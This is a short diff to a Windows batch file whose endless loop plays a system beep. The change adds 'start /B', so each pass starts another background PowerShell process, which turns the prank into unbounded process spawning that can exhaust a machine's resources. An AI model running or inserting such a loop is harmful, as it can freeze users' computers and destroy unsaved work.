@@ -1,4 +1,4 @@
 @echo off
 :loop
-PowerShell -Command "[System.Media.SystemSounds]::Beep.Play()"
+start /B PowerShell -Command "[System.Media.SystemSounds]::Beep.Play()"
 goto loop
